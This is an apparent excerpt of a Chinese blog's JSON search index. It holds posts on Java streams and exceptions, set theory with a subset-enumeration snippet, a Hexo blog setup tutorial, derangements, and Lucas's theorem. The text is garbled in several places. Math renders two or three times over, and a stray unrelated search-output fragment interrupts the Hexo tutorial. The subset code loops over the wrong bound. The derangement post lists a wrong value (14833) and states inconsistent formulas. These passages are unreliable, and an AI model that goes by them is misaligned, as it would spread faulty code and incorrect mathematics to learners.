name)：通过枚举常量的名字返回Direction常量，注意，这个方法与Enum类中的valueOf()方法的参数个数不同。 流 分类 字节流 字符流 输入流 输出流 按输入输出分：输入流、输出流 按字符字节分：字符流、字节流 按直接使用还是增强分：节点流和处理流： 关键字 input输入 output输出 stream流 writer字符输入流 reader字符输入流 File文件 异常 checked 检测性异常 再编译时就使用try、catch来预先捕获、提供解决方案 FileNotFoundException IOException InterruptedException 继承自Exception，必须捕获并处理 运行时异常 自己的原因，通过检查一下解决 ArryIndexOutOfBoundsException ClassCastException 数学类异常（除0） 这种异常继承RuntimeException，不需要捕获，需要通过检查来预防 错误 error StackOutOfMemoryError：如递归出不去 自定义异常 有时需要通过自定义异常来帮助处理一些业务","categories":[{"name":"Java","slug":"Java","permalink":"http://enderxiao.github.io/categories/Java/"},{"name":"基础","slug":"Java/基础","permalink":"http://enderxiao.github.io/categories/Java/%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://enderxiao.github.io/tags/Java/"},{"name":"Java基础语法","slug":"Java基础语法","permalink":"http://enderxiao.github.io/tags/Java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"}]},{"title":"离散数学:集合","slug":"离散数学-集合","date":"2021-01-23T02:24:52.000Z","updated":"2024-07-30T11:26:33.937Z","comments":true,"path":"2021/01/23/离散数学-集合/","permalink":"http://enderxiao.github.io/2021/01/23/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6-%E9%9B%86%E5%90%88/","excerpt":"","text":"集合基本概念 集合的表示法 列举法 特征法 子集 定理1.1：集合A和集合B相等的充要条件是：A⊆B⋀B⊆AA \\subseteq B \\bigwedge B \\subseteq AA⊆B⋀B⊆A 空集$ \\emptyset $是任何集合的子集 全集和补集 补集：设集合A，属于全集E，对于任意元素x x∈Ex \\in Ex∈E x∉Ax \\notin Ax∈/A 则有x促成的集合称为A的补集合，记为：~A或Aˉ\\bar{A}Aˉ 幂集 幂集：设A是集合，有A的所有子集作为元素构成的集合称为A的幂集，记为P(A) 定理1.2：设A是具有n个元素的有限集，即|A| = n ，其幂集的基∣P(A)∣=2n|P(A)| = 2^n∣P(A)∣=2n 定理1.1.2 证明 证明：根据排列组合规律，幂集的基为：∣P(A)∣=Cn0+Cn1+Cn2+...+Cnn证明： 根据排列组合规律，幂集的基为：|P(A)| = C_n^0+C_n^1+C_n^2+...+C_n^n 证明：根据排列组合规律，幂集的基为：∣P(A)∣=Cn0​+Cn1​+Cn2​+...+Cnn​ 由二项式定理得：(a+b)n=Cn0×an+Cn1×a(n−1)×b1+...+Cnn−1×a1×bn−1+Cnn×bn由二项式定理得：(a+b)^n = C_n^0 \\times a^n + C_n^1 \\times a^{(n-1)} \\times b^1 + ... + C_n^{n-1} \\times a^1 \\times b^{n-1} + C_n^n \\times b^n 由二项式定理得：(a+b)n=Cn0​×an+Cn1​×a(n−1)×b1+...+Cnn−1​×a1×bn−1+Cnn​×bn 令a=b=1，得：2n=Cn0+Cn1+Cn2+...+Cnn令a=b=1，得：2^n = C_n^0+C_n^1+C_n^2+...+C_n^n 令a=b=1，得：2n=Cn0​+Cn1​+Cn2​+...+Cnn​ ∴∣P(A)∣=2n\\therefore |P(A)| = 2^n ∴∣P(A)∣=2n 由此我们可以知道，一个集合A的所有子集的个数，一定是2的幂次，那么如何遍历一个集合的所有子集呢？ 子集的遍历（生成幂集） 遍历一个集合的子集，也就是要生成该集合对应的幂集，由于幂集的元素个数总为2的次方，而对于集合中的每一个元素，讨论他是否在某个子集中时，他只有两种状态，在于不在，于是可以用0，1两种表示，则我们可以用n位二进制来表示幂集中的所有元素，而由定理1.1.2的证明我们可以知道n位二进制数是足够的，下面我们来实现一下： 查看代码 12345678910111213141516void BinarySearch(set&lt;int&gt; &amp;mySet)&#123; int length = mySet.size(); int n = 1 &lt;&lt; length; for (int i = 0; i &lt; n; i++)//外层循环遍历序号 &#123; for (int j = 0; j &lt; n; j++)//内层循环遍历该序号二进制表示的每一位 &#123; if (i &amp; (1 &lt;&lt; j))//判断当前位是否为1 &#123; cout &lt;&lt; j &lt;&lt; &quot; &quot;; &#125; &#125; cout &lt;&lt; endl; &#125;&#125; 集合基本运算 交和并 A∩B=B∩AA \\cap B = B \\cap AA∩B=B∩A，A∪B=B∪AA \\cup B = B \\cup AA∪B=B∪A (A∩B)∩C=A∩(B∩C)(A \\cap B) \\cap C = A \\cap (B \\cap C)(A∩B)∩C=A∩(B∩C)，(A∪B)∪C=A∪(B∪C)(A \\cup B) \\cup C = A \\cup (B \\cup C)(A∪B)∪C=A∪(B∪C)——结合律 A∩A=AA \\cap A = AA∩A=A，A∪A=AA \\cup A = AA∪A=A A∩∅=∅A \\cap \\emptyset = \\emptysetA∩∅=∅，A∪∅=AA \\cup \\emptyset = AA∪∅=A A∩E=AA \\cap E = AA∩E=A，A∪E=EA \\cup E = EA∪E=E 分配律 定理1.3：A∩(B∪C)=(A∩B)∪(A∩C)A \\cap (B \\cup C) = (A \\cap B) \\cup (A \\cap C)A∩(B∪C)=(A∩B)∪(A∩C) 定理1.3：A∪(B∩C)=(A∪B)∩(A∪C)A \\cup (B \\cap C) = (A \\cup B) \\cap (A \\cup C)A∪(B∩C)=(A∪B)∩(A∪C) 德·摩根率 定理1.4：A∪Bˉ=Aˉ∩Bˉ\\bar{ A \\cup B } = \\bar{A} \\cap \\bar{B}A∪Bˉ=Aˉ∩Bˉ 定理1.4：A∩Bˉ=Aˉ∪Bˉ\\bar{ A \\cap B } = \\bar{A} \\cup \\bar{B}A∩Bˉ=Aˉ∪Bˉ 证明 点击查看证明 证明：设A∪Bˉ=P,Aˉ∩Bˉ=Q,x∈P,证明：设\\bar{ A \\cup B } = P,\\bar{A} \\cap \\bar{B} = Q, x \\in P,证明：设A∪Bˉ=P,Aˉ∩Bˉ=Q,x∈P,则x∉A⋀x∉B则 x \\notin A \\bigwedge x \\notin B则x∈/A⋀x∈/B即x∈Aˉ⋀x∈Bˉ即 x \\in \\bar{A} \\bigwedge x \\in \\bar{B}即x∈Aˉ⋀x∈Bˉ∴x∈Aˉ∩Bˉ\\therefore x \\in \\bar{A} \\cap \\bar{B}∴x∈Aˉ∩Bˉ∴P⊆Q\\therefore P \\subseteq Q∴P⊆Q设y∈Q设y \\in Q设y∈Q则y∈Aˉ⋀y∈Bˉ则y \\in \\bar{A} \\bigwedge y \\in \\bar{B}则y∈Aˉ⋀y∈Bˉ∴y∉A⋀y∉B\\therefore y \\notin A \\bigwedge y \\notin B∴y∈/A⋀y∈/B∴y∈P\\therefore y \\in P∴y∈P∴Q⊆P\\therefore Q \\subseteq P∴Q⊆P由定理1.1得P=Q由定理1.1得P = Q由定理1.1得P=Q 定理1.3也可由类似方法证明 吸收律 定理1.5：A∪(A∩B)=AA \\cup (A \\cap B) = AA∪(A∩B)=A 定理1.5：A∩(A∪B)=AA \\cap (A \\cup B) = AA∩(A∪B)=A 不知名公式 定理1.6：A∪(Aˉ∩B)=A∪BA \\cup (\\bar{A} \\cap B) = A \\cup BA∪(Aˉ∩B)=A∪B 差和对称差(异或) 差：设A、B为集合，x为元素 x∈Ax \\in Ax∈A x∉Bx \\notin Bx∈/B 由x组成的集合称为A与B的差集，记为A-B A−A=∅A-A = \\emptysetA−A=∅ $ A - \\emptyset = A$ A−E=∅A - E = \\emptysetA−E=∅ E−A=AˉE - A = \\bar{A}E−A=Aˉ 定理1.7：A−B=A∩BˉA - B = A \\cap \\bar{B}A−B=A∩Bˉ 定理1.7：A−(B∪C)=(A−B)∩(A−C)A - (B\\cup C) = (A - B) \\cap (A-C)A−(B∪C)=(A−B)∩(A−C) 定理1.7：A−(B∩C)=(A−B)∪(A−C)A - (B\\cap C) = (A - B) \\cup (A-C)A−(B∩C)=(A−B)∪(A−C) 对称差：设集合A、B，x为元素 x∈A⋀x∉B⋁x \\in A \\bigwedge x \\notin B \\bigveex∈A⋀x∈/B⋁ x∈B⋀x∉Ax \\in B \\bigwedge x \\notin Ax∈B⋀x∈/A 由x组成的集合称为A与B的对称差，记为A⊕BA \\oplus BA⊕B 定理1.8：A⊕B=(A−B)∪(B−A)A \\oplus B = (A - B) \\cup (B - A)A⊕B=(A−B)∪(B−A) 定理1.8：A⊕B=(A∪B)∩(Bˉ∪Aˉ)=(A∪B)−(A∩B)A \\oplus B = (A \\cup B) \\cap (\\bar{B} \\cup \\bar{A} ) = (A \\cup B) - (A \\cap B)A⊕B=(A∪B)∩(Bˉ∪Aˉ)=(A∪B)−(A∩B) 定理1.8：A∩(B⊕C)=(A∩B)⊕(A∩C)A \\cap (B \\oplus C) = (A \\cap B) \\oplus (A \\cap C)A∩(B⊕C)=(A∩B)⊕(A∩C) 集合运算总结 等幂率 A∩A=AA \\cap A = AA∩A=A A∪A=AA \\cup A = AA∪A=A 交换率 A∩B=B∩AA \\cap B = B \\cap AA∩B=B∩A A∪B=B∪AA \\cup B = B \\cup AA∪B=B∪A A⊕B=B⊕AA \\oplus B = B \\oplus AA⊕B=B⊕A 结合律 (A∩B)∩C=A∩(B∩C)(A \\cap B) \\cap C = A \\cap (B \\cap C)(A∩B)∩C=A∩(B∩C) (A∪B)∪C=A∪(B∪C)(A \\cup B) \\cup C = A \\cup (B \\cup C)(A∪B)∪C=A∪(B∪C) (A⊕B)⊕C=A⊕(B⊕C)(A \\oplus B) \\oplus C = A \\oplus (B \\oplus C)(A⊕B)⊕C=A⊕(B⊕C) 分配律 A∩(B∪C)=(A∩B)∪(A∩C)A \\cap (B \\cup C) = (A \\cap B) \\cup (A \\cap C)A∩(B∪C)=(A∩B)∪(A∩C) A∪(B∩C)=(A∪B)∩(A∪C)A \\cup (B \\cap C) = (A \\cup B) \\cap (A \\cup C)A∪(B∩C)=(A∪B)∩(A∪C) A∩(B⊕C)=(A∩B)⊕(A∩C)A \\cap (B \\oplus C) = (A \\cap B) \\oplus (A \\cap C)A∩(B⊕C)=(A∩B)⊕(A∩C) 摩根率 A∩Bˉ=Aˉ∪Bˉ\\bar{A \\cap B} = \\bar{A} \\cup \\bar{B}A∩Bˉ=Aˉ∪Bˉ A∪Bˉ=Aˉ∩Bˉ\\bar{A \\cup B} = \\bar{A} \\cap \\bar{B}A∪Bˉ=Aˉ∩Bˉ 吸收率 A∩(A∪B)=AA \\cap (A \\cup B) = AA∩(A∪B)=A A∪(A∩B)=AA \\cup (A \\cap B) = AA∪(A∩B)=A 补余率 A∩Aˉ=∅A \\cap \\bar{A} = \\emptysetA∩Aˉ=∅ A∪Aˉ=EA \\cup \\bar{A} = EA∪Aˉ=E 同一率 A∩E=AA \\cap E = AA∩E=A A∪∅=AA \\cup \\emptyset = AA∪∅=A 零一率 A∪E=EA \\cup E = EA∪E=E A∩∅=∅A \\cap \\emptyset =\\emptysetA∩∅=∅ 其它 Aˉˉ=A\\bar{\\bar{A}} = AAˉˉ=A A−B=A∩BˉA - B = A \\cap \\bar{B}A−B=A∩Bˉ A⊕B=(A−B)∪(B−A)=(A∩Bˉ∪(Aˉ∩B)=(A∪B)−(A∩B)=(A∪B)∩(Aˉ∪Bˉ)A \\oplus B = (A - B) \\cup (B - A) = (A \\cap \\bar{B} \\cup (\\bar{A} \\cap B) = (A \\cup B) - (A \\cap B) = (A \\cup B) \\cap (\\bar{A} \\cup \\bar{B})A⊕B=(A−B)∪(B−A)=(A∩Bˉ∪(Aˉ∩B)=(A∪B)−(A∩B)=(A∪B)∩(Aˉ∪Bˉ) A⊕A=∅A \\oplus A = \\emptysetA⊕A=∅ ∅ˉ=E\\bar{\\emptyset} = E∅ˉ​=E $ \\bar{E} = \\emptyset$","categories":[{"name":"离散数学","slug":"离散数学","permalink":"http://enderxiao.github.io/categories/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/"},{"name":"研究生入学考试","slug":"研究生入学考试","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F%E5%85%A5%E5%AD%A6%E8%80%83%E8%AF%95/"},{"name":"复试","slug":"研究生入学考试/复试","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F%E5%85%A5%E5%AD%A6%E8%80%83%E8%AF%95/%E5%A4%8D%E8%AF%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://enderxiao.github.io/tags/%E7%AE%97%E6%B3%95/"},{"name":"离散数学","slug":"离散数学","permalink":"http://enderxiao.github.io/tags/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/"},{"name":"集合","slug":"集合","permalink":"http://enderxiao.github.io/tags/%E9%9B%86%E5%90%88/"},{"name":"二进制枚举","slug":"二进制枚举","permalink":"http://enderxiao.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%9E%9A%E4%B8%BE/"}]},{"title":"使用hexo搭建个人博客","slug":"使用hexo搭建个人博客","date":"2021-01-19T11:52:50.000Z","updated":"2024-07-30T11:26:33.923Z","comments":true,"path":"2021/01/19/使用hexo搭建个人博客/","permalink":"http://enderxiao.github.io/2021/01/19/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/","excerpt":"","text":"搭建博客的理由 记得刚上大学，进入到ACM，遇到想了半天没思路的的题，习惯性的上百度看别人的解析，于是发现很多人都会去维护一个自己的“网站”（当时觉得这种由自己网站的大佬好酷2333），当时并不知道是什么，于是各种查资料，并自学了 一些前端的技术，于是使用Hexo着手搭建了自己的第一个博客，当时搭建博客的主要目的是写一些做题笔记，好让自己赛前复习用，之后由于要给新加入ACM的新生们上课，于是就用作发布课程讲义了，再后来，大三跟队友做了些项目，外加考研复习，第一个博客就基本上没怎么更新了，渐渐被我遗忘在了角落，直到疫情期间在家倒腾笔记本的时候把南侨芯片烧了。。。。，电脑修好拿回来，脑子一热重做了系统，于是原来的博客由于没有做备份于是就这么没了。 现在已经是大四下学期了，刚考完研究生的我正焦急的等待着成绩，我想着也不能让自己闲着，于是就决定重新弄一弄自己的博客。 在制作第一个博客的时候，我对前端“三大金刚”的学习还是入门阶段，对hexo的使用也紧紧停留于看看别人的快速入门指南这种程度。于是从头再来，认真阅读官方文档（其实内容确实不多，主要是因为之前懒2333） 那么，回到标题，我为什么想要搭建一个个人博客呢，在我进入ACM之后，我认识到了一个问题，那就是对我来说，掌握一门知识，输出比输入要难，如果一门知识我可以很好的把他输出给别人看，那么说明我对这门知识的掌握程度上升了一个高度。撰写博客时，我对学过的知识进行回顾、归纳、总结、并用自己的话说出来，这样对我来说大概是一个很好的复习、巩固的过程。所以就有了这篇教学文档，我喜欢把我认为好的东西分享给身边的朋友以及学弟学妹。 第一部分：Hexo、Github，域名 这一部分大家的教程都大同小异，但我身边的朋友们其实在项目中Git接触的较少，所以我会更多的去讲解一些Git的知识，并且可能涉及到一些计算机网络方面的知识。 Hexo Hexo简介 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 这是Hexo官网对hexo的介绍，Hexo，基于Node.js，依赖少，便于安装，且可托管到GitHub等网站，许多人喜欢使用这个框架搭建自己的个人网站，Hexo的创建者来自台湾，对中文支持友好。 Hexo搭建 由于Hexo时基于Node.js的，所以在安装Hexo之前，我们得安装Node.js，下载地址： Node.js官网 Node.js Node.js是什么呢，下面引用一段百度百科 Node.js发布于2009年5月，由Ryan Dahl开发，是一个基于Chrome V8引擎的JavaScript运行环境，使用了一个事件驱动、非阻塞式I/O模型， [1] 让JavaScript 运行在服务端的开发平台，它让JavaScript成为与PHP、Python、Perl、Ruby等服务端语言平起平坐的脚本语言。 我对Node.js的理解是什么呢： 我理解的前端&quot;三大金刚&quot;包括：HTML、CSS、Javascript 其中Javascript是一门脚本语言，用来定义一个网页的行为，比如定义点击某个按钮会发生什么样的事情 那么Javascript能不能像C++、Java、Python那样来写服务端逻辑呢，本来是不能的，直到Node.js的出现 Node.js是一个基于Chrome V8引擎的JS运行环境，可以让JS运行在服务端的开发平台。也就是说，可以用JS写后端逻辑了 NPM 接下来的安装我们需要用到npm，npm啥呢 NPM: npm is the world’s largest software registry. 这段话来自npm官网，来自世界各地的开发者使用npm来分享他们的开源项目，npm被包含在了node.js中，也就是说，当我们安装上node.js的时候，npm就一起被我们安装了，因为npm其实是node.js的包管理工具，在前端开发中，许多需要反复使用的代码大家会做成模块发布到npm上，这是只要通过npm下载使用即可，而且npm会将该模块有以来关系的模块全部下载管理。 以上两个软件被安装以后，可以打开windows下的cmd，或者powershell，使用如下命令验证是否安装成功： 12node -vnpm -v 另外，linux下的安装比windwos下要方便很多，只需要如下两行命令即可： 12sudo apt-get install nodejssudo apt-get install npm 安装Git Git简介 每次介绍git时，就不得不提起linux，在程序员数量越来越多的今天，Linux相信已经不是什么十分陌生的的名词了，Linus在1991年创建了开源的Linux，据说这位哥在维护Linux时，由于开源项目的特性，有世界各地的程序员向他提出改进方案，Linus为了管理这些修改而产生的不同版本，开发了git这么一种项目管理工具，当时CVS、SVN这些免费的管理工具速度较慢，且需要联网，而另一些商用版本管理工具需要收费，与开源精神相悖，于是这位哥就自己造轮子，花了两周的时间用C写了一个分布式版本控制系统，就是Git。 那么什么是版本管理工具呢，这里引用一下料廖雪峰老师的例子： 廖雪峰Git教程https://www.liaoxuefeng.com/wiki/896043488029600/896067008724000 什么是GitGit是目前世界上最先进的分布式版本控制系统（没有之一）。Git有什么特点？简单来说就是：高端大气上档次！那什么是版本控制系统？如果你用Microsoft Word写过长篇大论，那你一定有这样的经历：想删除一个段落，又怕将来想恢复找不回来怎么办？有办法，先把当前文件“另存为……”一个新的Word文件，再接着改，改到一定程度，再“另存为……”一个新文件，这样一直改下去，最后你的Word文档变成了这样：过了一周，你想找回被删除的文字，但是已经记不清删除前保存在哪个文件里了，只好一个一个文件去找，真麻烦。看着一堆乱七八糟的文件，想保留最新的一个，然后把其他的删掉，又怕哪天会用上，还不敢删，真郁闷。更要命的是，有些部分需要你的财务同事帮助填写，于是你把文件Copy到U盘里给她（也可能通过Email发送一份给她），然后，你继续修改Word文件。一天后，同事再把Word文件传给你，此时，你必须想想，发给她之后到你收到她的文件期间，你作了哪些改动，得把你的改动和她的部分合并，真困难。于是你想，如果有一个软件，不但能自动帮我记录每次文件的改动，还可以让同事协作编辑，这样就不用自己管理一堆类似的文件了，也不需要把文件传来传去。如果想查看某次改动，只需要在软件里瞄一眼就可以，岂不是很方便？这个软件用起来就应该像这个样子，能记录每次文件的改动：版本文件名用户说明日期1service.doc张三删除了软件服务条款57/12 10:382service.doc张三增加了License人数限制7/12 18:093service.doc李四财务部门调整了合同金额7/13 9:514service.doc张三延长了免费升级周期7/14 15:17这样，你就结束了手动管理多个“版本”的史前时代，进入到版本控制的20世纪。 有了Git的帮助，我们就可以很方便的管理我们的hexo本博客文章了，此外使用Git，还能将你的博客长传到Github，部署到Github，成为你的个人主页，Git的操作是基于命令行的，各种命令的用法可以前往廖雪峰老师的博客进行查看，学习。 Git 安装 WindowsLinuxgit官网1sudo apt-get install git 安装完成以后，使用 1git --version 查看版本号，进行验证 安装Hexo 以上工具安装完成后，就能开始搭建Hexo静态博客了，首先在本地创建一个文件夹，给它一个响亮的名字，比如EnderBlog，然后使用cd命令进入这个文件夹，或者在这个文件夹下右键git bash打开。 使用 1npm install -g hexo-cli 命令安装hexo，使用 1hexo -v xxxxxxxxxx6 1[[(2)[0] (2)[1] (5)[2] (1)[3] (5)[4] (3)[5] (4)[6] (3)[7]]2 [(3)[5] (5)[6] (2)[7] (2)[0] (1)[1] (3)[2] (4)[3] (5)[4]]3 [(3)[4] (4)[5] (2)[6] (5)[7] (1)[0] (3)[1] (2)[2] (1)[3]]4 [(4)[3] (1)[4] (3)[5] (4)[6] (5)[7] (3)[0] (2)[1] (3)[2]]] # 最终状态5[0, 3, 4, 5] # 最终状态表示6286 # 拓展节点个数shell 接下来初始化一下hexo 1hexo init myBlog 此处myBlog可以任意起名，会在你的当前目录下创建一个以该字符串命名的目录，hexo会为你创建一个博客框架，接下里使用命令 12cd myBlog #此处用cd到你之前起名的文件夹npm install 安装hexo的所有依赖包，该命令会在我们的当前目录下生成一个node_modules目录，用来存放这些依赖包 到目前为止，我们的博客目录应该包含如下文件: node_modules: 存放依赖包 public: 存放有markdown生成的页面 scaffolds: 存放用于生成文章的模板 source: 存放文章的本体 themes: 存放主题 config.yml: 博客的配置文件 接下来一个博客的大致框架就已经搭建好了，使用如下命令，就能直接看到我们的第一个版本的博客了： 12hexo g #hexo的生成命令，完整形式为hexo generate，用于根据markdown生成一个html页面hexo s #启动hexo服务，完整形式为hexo serve，用于启动hexo服务， 此时，在浏览器中输入localhost:4000就可以看到你生成的博客了。 localhost-即127.0.0.1，是回送地址，一般代表本机地址 4000带表端口号，传输层用于分流/合流 Github 这里引用知乎提问：Github 是怎样的一个存在，的一个回答，该回答来自知乎ID：古土雷柏 Github 是怎样的一个存在https://www.zhihu.com/question/28976652?sort=created github是共产主义在软件开发领域的具体实现样板之一，即以生产资料社会公有制为基础（代码开源），以社会化合作（离散化的个人、组织等社会颗粒）为生产方式，主要采用合作社组织形式（项目组）的技术支撑平台。 虽然可能说的比较夸张，但是确实把Github的模式很好的概况了，而且也方便理解。 github可以通过git，将你的代码托管到这一平台上，平台社区里的用户可以共享到你的项目。通过issue的方式向你提出建议。 那么第一步就是上Github申请一个账号：Github 我们利用Github提供的Github Pages功能搭建一个个人博客。 登录github之后选择新建一个仓库 未完待续…","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"blog","slug":"blog","permalink":"http://enderxiao.github.io/tags/blog/"}]},{"title":"数论番外:错排问题","slug":"数论番外-错排问题","date":"2021-01-18T12:54:17.000Z","updated":"2024-07-30T11:26:33.935Z","comments":true,"path":"2021/01/18/数论番外-错排问题/","permalink":"http://enderxiao.github.io/2021/01/18/%E6%95%B0%E8%AE%BA%E7%95%AA%E5%A4%96-%E9%94%99%E6%8E%92%E9%97%AE%E9%A2%98/","excerpt":"","text":"错排问题 什么是错排问题 若有n个人，都想给其他n-1个人中的任意一个送信（当然不能送给自己），请问一共有多少种送法？ 建模 对于一个具体的题目，数学上喜欢抽象，于是可以把这样的问题抽象为一个数学模型，下面给出定义 对于n个元素，若一个排列中所有的元素都不在自己原来的位置上，那么这样的排列就叫原排列的一个错排，n个元素的错排数记为D(n)。研究一个排列的错排个数的问题，就叫做错排问题或称为更列问题 归纳 下面给出一些较小的错排数： 对于只包含1个元素的序列，全排列为1！=1，即没有错排，则错排数D(1)=0， 对于2个元素的序列，全排列为2！=2，假设是1，2；则错排数只有一组：2，1。则错排数D(2)=1; 以此类推 0，1，2，9，44，265，14833……. 总结 上述推导就是使用枚举法将错排数一一找出，聪明的犊子应该已经发现了其中的规律，下面给出一个递归的推导式： $ D(n)=(n-1)*(D(n-1)+D(n-2)) $ 感兴趣的同学可以使用数学归纳法证明一下这个推导式的正确性，这里不予讨论。 推导 观察发现，此递推式是一个递归方法（指有限步骤内，根据特定的法则或公式对一个或多个前面的元素进行运算，以确定一系列元素的方法）。于是思考，能否使用递归的思想来推导这个递归方法。 对于n个元素，显然D(1)=0,D(2)=1,则思考当$ n \\geq 3 $时的情况 若此时第n个数，恰好放在k的位置，且$ k！=n $，则对于n的位置上，就出现了两种情况： Ⅰ.n的位置上恰好为k时 Ⅱ.n的位置上不为k时 下面对两种情况分类讨论： Ⅰ.此时情况较为简单，即n和k调换位置，其他n−2n-2n−2个数恰好构成了新的错排问题，错排数为D(n-2)。 Ⅱ.此时因为k在n的位置上的情况已经讨论过了，所以在此情况下，无法在n的位置上，此时可以将n的位置视为元素k原本的位置（仔细思考）。那么k与剩下n−2n-2n−2个数又构成了新的错排问题，错排数为D(n-1)； 综上，在n确认放在k的位置（$ k!=n ）上时，有）上时，有）上时，有 D(n-1)+D(n-2) 个错排，而考虑k有个错排，而考虑k有个错排，而考虑k有 n-1 种可能，所以最后得到递推式：种可能，所以最后得到递推式：种可能，所以最后得到递推式： D(n)=(n-1)\\times (D(n-1)+D(n-2)) $ 递归证明 因为错排数中存在某种规律，于是我们尝试推导错排数所组成的数列的通项公式。 通过之前的推导我们知道， $ D(n)=(n-1) \\times (D(n-1)+D(n-2)) $ 此处为了方便起见，我们设 $ D(n)=n! \\times M(n) $(为什么之后用其他的方法证明),其中 $ M(1)=0,M(2)=1/2……M(n)=1/n $ 于是原推导式变为了： $ D(n)=n! \\times M(n)=(n-1)\\times ((n-1)! \\times M(n-1)+(n-2)! \\times M(n-2)) $ 展开得: $ n! \\times M(n)=(n-1) \\times (n-1)! \\times M(n-1)+(n-1) \\times (n-2)! \\times M(n-2) $ 化简得: $ n! \\times M(n)=n! \\times M(n-1)-(n-1)! \\times M(n-1)+(n-1)! \\times M(n-2) $ 同除(n-1)!: $ n \\times M(n)=n \\times M(n-1)-M(n-1)+M(n-2) $ 移项得: $ M(n)-M(n-1)=(-1/n) \\times (M(n-1)-M(n-2)) $ 于是展开 $ (M(n-1)-M(n-2)) $ 得: $ M(n)-M(n-1)=(-1/n) \\times (-1/(n-1)) \\times (M(n-2)-M(n-3))) $ 依次类推得： $ M(n)-M(n-1)=(-1/n) \\times (-1/(n-1))……(-1/3) \\times (M(2)-M(1)) \\times (-1) \\times (-1) $(多乘两个-1为了方便合并) 化简得: $ M(n)-M(n-1)=(-1)^n \\times 1/n! $ 于是使用累加法： $ M(n)-M(n-1)=(-1)^n \\times 1/n! $ $ M(n-1)-M(n-2)=(-1)^{n-1} \\times 1/(n-1)! $ $ M(n-2)-M(n-3)=(-1)^{n-2} \\times 1/(n-2)! $ …… $ M(2)-M(1)=(-1)^2 \\times 1/2! $ 累加得: $ M(n)-M(1)=(-1)^2 \\times 1/2!+…+(-1)^{n-2} \\times 1/(n-2)!+(-1)^{n-1} \\times 1/(n-1)!+(-1)^n \\times 1/n! $ 则 $ D(n)=n! \\times (1/2!-1/3!+1/4!-…+(-1)^n \\times 1/n!) $ 容斥原理证明 于是我们得到了错排数的通项公式，聪明的犊子可能已经发现了，在使用递归法证明的时候里面蕴藏了一点容斥原理的知识，下面我们使用容斥原理来证明这个通项公式 对于n个元素，如果k的位置刚好放的是k，那么这样的排列一共有(n-1)!个，考虑到k可以取n个不同的值，所以一共有 $ n_(n-1)! $ 种情况，至少放对了一个，但是我们需要求的是一个都没放对的排列个数，所以我们需要使用总的排列数减去这些，即 $ n!-n_(n-1)! $ ,但是至少放对了一个的情况下又包含了放对2个的情况，我们多减了一次，于是我们需要加回来，但是至少放对2个的情况种又包含了至少放对3个的情况，于是又要加上,……,依次类推，我们得到式子： $ D(n)=n!-C_n^1\\times (n-1)! + C^2_n \\times (n-2)! - C^3_n \\times (n-3)!+…+(-1)^n \\times C^n_n \\times 0! $ 即 $ D(n)=n!(1-1/1!+1/2!+…+(-1)^n\\times 1/n!) $ 即 $ D(n)=n!(1/2!+…+(-1)^n\\times 1/n!) $","categories":[{"name":"ACM","slug":"ACM","permalink":"http://enderxiao.github.io/categories/ACM/"},{"name":"算法","slug":"ACM/算法","permalink":"http://enderxiao.github.io/categories/ACM/%E7%AE%97%E6%B3%95/"},{"name":"数论番外","slug":"ACM/数论番外","permalink":"http://enderxiao.github.io/categories/ACM/%E6%95%B0%E8%AE%BA%E7%95%AA%E5%A4%96/"}],"tags":[{"name":"数论","slug":"数论","permalink":"http://enderxiao.github.io/tags/%E6%95%B0%E8%AE%BA/"},{"name":"算法竞赛","slug":"算法竞赛","permalink":"http://enderxiao.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"}]},{"title":"数论进阶:Lucas定理","slug":"数论进阶-Lucas定理","date":"2021-01-18T12:43:11.000Z","updated":"2024-07-30T11:26:33.935Z","comments":true,"path":"2021/01/18/数论进阶-Lucas定理/","permalink":"http://enderxiao.github.io/2021/01/18/%E6%95%B0%E8%AE%BA%E8%BF%9B%E9%98%B6-Lucas%E5%AE%9A%E7%90%86/","excerpt":"","text":"Lucas定理 Lucas定理详述 内容 对于一个组合数CmnC_m^nCmn​，取模一个素数ppp的值，假设n=a×p+bn=a\\times p+bn=a×p+b,m=c×p+dm=c\\times p+dm=c×p+d有： Cnm≡Cac×Cbd(mod p)C_n^m≡C_a^c\\times C_b^d(\\mod p)Cnm​≡Cac​×Cbd​(modp) 证明 先证明一个一会儿要用到的定理： (1+x)p≡1+xp(mod p)(1+x)^p≡1+x^p(\\mod p)(1+x)p≡1+xp(modp) 这里可以用费马小定理加以证明: 由于(1+x)p≡(1+x)(mod p)(1+x)^p≡(1+x)(\\mod p)(1+x)p≡(1+x)(modp) 且xp≡x(mod p)x^p≡x(\\mod p)xp≡x(modp)即1+xp≡1+x(mod p)1+x^p≡1+x(\\mod p)1+xp≡1+x(modp) 于是得证：(1+x)p≡1+xp(mod p)(1+x)^p≡1+x^p(\\mod p)(1+x)p≡1+xp(modp) 然后设n=a×p+bn=a\\times p+bn=a×p+b,m=c×p+dm=c\\times p+dm=c×p+d 于是：(1+x)n≡(1+x)a×p+b(mod p)(1+x)^n≡(1+x)^{a\\times p+b}(\\mod p)(1+x)n≡(1+x)a×p+b(modp) 即： (1+x)n≡(1+x)a×p×(1+x)b(mod p)(1+x)^n≡(1+x)^{a\\times p}\\times (1+x)^b(\\mod p)(1+x)n≡(1+x)a×p×(1+x)b(modp) 由之前证明的定理得： (1+x)a×p≡(1+xp)a(mod p)(1+x)^{a\\times p}≡(1+x^p)^a(\\mod p)(1+x)a×p≡(1+xp)a(modp) 即： (1+x)a×p+b≡(1+xp)a×(1+x)b(mod p)(1+x)^{a\\times 